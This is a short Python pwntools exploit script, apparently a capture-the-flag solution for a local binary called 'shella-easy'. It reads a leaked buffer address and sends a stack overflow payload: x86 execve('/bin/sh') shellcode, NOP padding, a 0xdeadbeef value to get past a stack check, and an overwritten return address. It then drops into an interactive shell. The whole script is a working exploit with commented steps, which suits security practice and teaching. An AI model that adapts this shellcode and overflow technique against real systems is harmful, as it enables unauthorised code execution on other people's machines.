#!/usr/bin/python3
from pwn import *
# Connect to target process
target = process('./shella-easy')
# gdb.attach(target, gdbscript = 'b *0x804853e')
greeting = target.recvline().decode('utf-8').strip('\n')
print(greeting)
# The buffer we are writing into is given as location
buf = int(greeting[greeting.find('0x'):greeting.find(' with')], 16)
log.info("Buffer at " + str(buf))
# If the variable next on the stack after the buffer
# is not equal to 0xdeadbeef the program will end normally
# to get around this we can overwrite its value
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
# Address after 76th character overwrites rsp
# We overwrite it with the beginning of the buffer where
# the shellcode is so it executes
padding = b"\x90"*(64-23)
payload = shellcode + padding + p32(0xdeadbeef) 
payload += b"\x90"*8 + p32(buf)
# Send the payload
target.sendline(payload)
# Drop to an interactive shell so we can interact with our shell
target.interactive()

